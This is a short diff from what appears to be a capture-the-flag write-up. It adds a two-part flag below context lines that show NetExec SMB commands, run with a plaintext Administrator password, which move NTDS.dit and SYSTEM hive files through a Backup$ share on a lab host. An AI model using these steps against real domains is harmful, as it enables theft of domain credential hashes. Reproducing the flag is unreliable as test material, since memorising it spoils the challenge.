@@ -24,3 +24,7 @@
    1. `poetry run nxc smb 192.168.108.10 -u Administrator -p C8J33i45kt4HXHMQ --share Backup$ --put-file NTDS.dit '\Export\NTDS.dit'`
    2. `poetry run nxc smb 192.168.108.10 -u Administrator -p C8J33i45kt4HXHMQ --share Backup$ --put-file SYSTEM '\Export\SYSTEM'`
 
+
+# Flag
+Part1: flag{m0v3_f4st_br34k
+Part2: _th3_f0r3st_89a71f9g}
